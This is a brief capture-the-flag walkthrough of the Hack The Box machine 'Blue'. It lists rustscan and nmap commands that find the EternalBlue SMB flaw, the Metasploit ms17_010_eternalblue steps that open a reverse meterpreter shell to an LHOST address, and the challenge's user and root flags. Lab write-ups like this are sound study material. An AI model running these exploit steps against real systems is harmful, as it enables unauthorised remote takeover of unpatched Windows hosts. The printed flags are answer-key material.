# Blue - Easy

```shell
rustscan -a 10.10.10.40 --range 0-65535 --ulimit 5000 -- -sV

nmap -T4 -p 445 --script vuln 10.10.10.40
#shows EternalBlue vulnerability

msfconsole -q

search eternalblue

use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS 10.10.10.40

set LHOST 10.10.14.6

run
#meterpreter shell

shell
#switch to Windows cmd

#get user flag and root flag
```

```markdown
Open ports & services:

  * 135 - msrpc - RPC
  * 139 - netbios-ssn - netbios-ssn
  * 445 - microsoft-ds - microsoft-ds

We can check for vulnerabilities using nmap as well, using script 'vuln'.

nmap shows that the remote host is vulnerable to RCE in SMBv1 server, that is, CVE-2017-0143 (EternalBlue).

We can exploit this with Metasploit by using the ms17_010_eternalblue exploit.

By running the exploit, we get shell as root.

User flag can be found from haris' desktop and root flag in Administrator's desktop.
```

1. User flag - 60d5760aee7a4757809842e991045287

2. Root flag - 0b349bb2b5261bbe7fb77ae272046cda
